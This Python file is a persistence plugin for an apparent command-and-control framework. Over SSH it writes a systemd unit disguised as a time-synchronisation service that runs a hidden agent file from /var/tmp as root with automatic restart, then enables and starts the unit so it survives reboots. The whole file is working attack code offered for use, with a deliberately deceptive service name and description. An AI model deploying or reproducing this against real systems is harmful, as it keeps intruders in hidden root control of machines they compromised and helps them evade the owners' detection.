#!/usr/bin/env python3
"""
Creates a hidden systemd service that launches the C2 agent on boot.
"""

import os
from typing import Dict, Any

from core.plugins.base import OctopusPlugin

class SystemdPersistence(OctopusPlugin):
    name = "systemd"
    description = "Installs payload via hidden systemd service."
    type = "persistence"

    def run(self, **kwargs) -> Dict[str, Any]:
        target = kwargs.get("target")
        payload_path = kwargs.get("payload_path", "/var/tmp/.octopus_agent")
        service_name = kwargs.get("service_name", "systemd-timesyncd-update.service")
        client = kwargs.get("ssh_client")

        if not client:
            return {"status": "error", "error": "Requires an active ssh_client"}

        # 1. Upload payload (simulated here via echo for testing, in reality use SFTP)
        # 2. Create service file
        service_content = f"""[Unit]
Description=System Time Synchronization Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=60
User=root

[Install]
WantedBy=multi-user.target
"""
        service_path = f"/etc/systemd/system/{service_name}"
        
        try:
            from killchain import _ssh_exec
            
            # Write service file
            cmd = f"echo '{service_content}' > {service_path} && chmod 644 {service_path}"
            out = _ssh_exec(client, cmd)
            
            # Enable and start
            _ssh_exec(client, "systemctl daemon-reload")
            _ssh_exec(client, f"systemctl enable {service_name}")
            _ssh_exec(client, f"systemctl start {service_name}")
            
            return {
                "status": "success", 
                "data": {"service": service_name, "path": service_path}
            }
        except Exception as e:
            return {"status": "error", "error": str(e)}

# The class will be automatically discovered by plugin_manager.py
